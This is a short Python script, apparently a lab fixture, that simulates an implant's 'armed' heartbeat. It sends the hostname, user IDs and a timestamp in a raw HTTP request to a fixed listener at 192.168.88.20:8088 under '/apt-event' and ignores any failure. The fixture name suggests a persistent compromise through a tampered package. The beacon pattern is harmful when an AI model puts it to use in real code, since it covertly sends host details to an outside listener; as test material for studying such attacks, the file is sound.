#!/usr/bin/env python3
"""Send one bounded armed-state heartbeat to the fixed lab listener."""

import os
import platform
import socket
import time
from urllib.parse import urlencode


def main() -> None:
    fields = urlencode(
        {
            "event": "armed-alive",
            "host": platform.node(),
            "uid": os.getuid(),
            "euid": os.geteuid(),
            "epoch": int(time.time()),
            "fixture": "react-codeshift-1.3.1-persistent-arm",
        }
    )
    request = (
        f"GET /apt-event?{fields} HTTP/1.1\r\n"
        "Host: 192.168.88.20:8088\r\n"
        "Connection: close\r\n\r\n"
    ).encode("ascii", "strict")
    try:
        with socket.create_connection(("192.168.88.20", 8088), timeout=0.5) as channel:
            channel.sendall(request)
    except OSError:
        pass


if __name__ == "__main__":
    main()
